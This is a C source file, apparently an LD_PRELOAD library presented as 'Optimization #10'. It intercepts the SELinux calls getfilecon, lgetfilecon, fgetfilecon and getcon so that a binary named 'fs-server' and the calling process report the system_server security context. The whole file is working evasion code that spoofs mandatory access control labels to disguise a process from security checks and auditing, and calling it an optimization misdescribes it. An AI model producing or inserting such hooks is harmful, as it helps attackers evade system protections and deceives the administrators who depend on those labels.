#define _GNU_SOURCE
#include <sys/stat.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

// Optimization #10: SELinux Context Spoofing

// Fake SELinux context to appear as system service
static const char *fake_context = "u:r:system_server:s0";

// Hook getfilecon to return fake context
int getfilecon(const char *path, char **context) {
    static int (*real_getfilecon)(const char*, char**) = NULL;
    if (!real_getfilecon) {
        real_getfilecon = dlsym(RTLD_NEXT, "getfilecon");
    }
    
    // For our binary, return fake context
    if (path && strstr(path, "fs-server")) {
        *context = strdup(fake_context);
        return strlen(fake_context) + 1;
    }
    
    return real_getfilecon(path, context);
}

// Hook lgetfilecon
int lgetfilecon(const char *path, char **context) {
    static int (*real_lgetfilecon)(const char*, char**) = NULL;
    if (!real_lgetfilecon) {
        real_lgetfilecon = dlsym(RTLD_NEXT, "lgetfilecon");
    }
    
    if (path && strstr(path, "fs-server")) {
        *context = strdup(fake_context);
        return strlen(fake_context) + 1;
    }
    
    return real_lgetfilecon(path, context);
}

// Hook fgetfilecon
int fgetfilecon(int fd, char **context) {
    static int (*real_fgetfilecon)(int, char**) = NULL;
    if (!real_fgetfilecon) {
        real_fgetfilecon = dlsym(RTLD_NEXT, "fgetfilecon");
    }
    
    // Check if fd is our process
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/self/fd/%d", fd);
    
    char link_path[256];
    ssize_t len = readlink(proc_path, link_path, sizeof(link_path) - 1);
    if (len > 0) {
        link_path[len] = '\0';
        if (strstr(link_path, "fs-server")) {
            *context = strdup(fake_context);
            return strlen(fake_context) + 1;
        }
    }
    
    return real_fgetfilecon(fd, context);
}

// Hook getcon to fake our process context
int getcon(char **context) {
    *context = strdup(fake_context);
    return strlen(fake_context) + 1;
}
